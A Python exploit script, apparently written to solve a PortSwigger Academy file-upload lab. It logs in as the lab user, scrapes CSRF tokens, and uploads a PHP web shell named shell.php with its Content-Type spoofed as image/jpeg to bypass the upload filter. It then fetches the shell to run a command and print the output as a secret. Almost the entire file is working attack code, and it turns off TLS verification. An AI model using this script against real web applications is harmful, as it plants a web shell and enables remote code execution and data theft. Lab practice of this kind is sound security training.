import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.8080' , 'https' : 'http://127.0.0.1:8080'}


def get_session_cookie_and_csrf_token(url):
    path = "/login"
    r = requests.get(url + path, verify=False, proxies=proxies)
    session_cookie = r.cookies.get_dict()['session']
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input")["value"]
    return session_cookie, csrf_token

def get_authenticated_session_cookie(url, session_cookie, csrf_token):
    path = "/login"
    cookie = {'session' : session_cookie}
    params = {'csrf' : csrf_token, 'username' : 'wiener' , 'password' : 'peter'}
    r = requests.post(url + path, cookies=cookie, data=params, allow_redirects=False, verify=False, proxies=proxies)
    authenticated_session_cookie = r.cookies.get_dict()['session']
    return authenticated_session_cookie

def get_upload_csrf_token(url, authenticated_session_cookie):
    path = "/my-account"
    cookies = {'session' : authenticated_session_cookie}
    r = requests.get(url + path, cookies=cookies, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    s = soup.findAll("input")[1]
    upload_csrf_token = re.search(r"[a-z,A-Z,0-9]{32}", str(s))
    return upload_csrf_token.group(0)

def post_upload(url, authenticated_session_cookie, upload_csrf_token):
    path = "/my-account/avatar"
    files = {'avatar' : ("shell.php", open(r"C:\Users\acalarco\csec\web-pentest\portswigger-academy\file-upload\shell-lab01.php", "rb"), 'image/jpeg')}
    cookies = {'session' : authenticated_session_cookie}
    params = {'user' : 'wiener' , 'csrf' : upload_csrf_token}
    r = requests.post(url + path, files=files, cookies=cookies, data=params, verify=False, proxies=proxies)
    if r.status_code == 200 and "has been uploaded" in r.text:
        return True
    else:
        return False

def file_content(url):
    path = "/files/avatars/shell.php"
    r = requests.get(url + path, verify=False, proxies=proxies)
    return r.text


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Testing for a file upload vulnerability bypassing Content-Type restriction\n")
    print("[+] Sending a GET request to /login page in order to fetch a session cookie and a csrf token needed to send a Post request to /login page")
    session_cookie,csrf_token = get_session_cookie_and_csrf_token(url)
    print("[+] The session cookie is {0} while the csrf token is {1}\n".format(session_cookie, csrf_token))
    print("[+] Sending a POST request to /login and retrieving an authenticated session cookie as user wiener")
    authenticated_session_cookie = get_authenticated_session_cookie(url, session_cookie, csrf_token)
    print("[+] The authenticated session cookie is %s\n" % authenticated_session_cookie)
    print("[+] Fetching a new csrf token needed to upload a file")
    upload_csrf_token = get_upload_csrf_token(url, authenticated_session_cookie)
    print("[+] The csrf token is %s\n" % upload_csrf_token)
    print("[+] Sending an upload POST multipart request with Content-Type for the file modified to image/jpeg")
    if not post_upload(url, authenticated_session_cookie, upload_csrf_token):
        print("[-] Upload failed")
        sys.exit(-1)
    print("[+] Upload is successful!!!\n")
    print("[+] Send GET request to /files/avatars/shell.php to execute the remote command and retrieve its output from the http response")
    secret = file_content(url)
    print("[+] Secret is %s" % secret)




if __name__ == "__main__":
    main()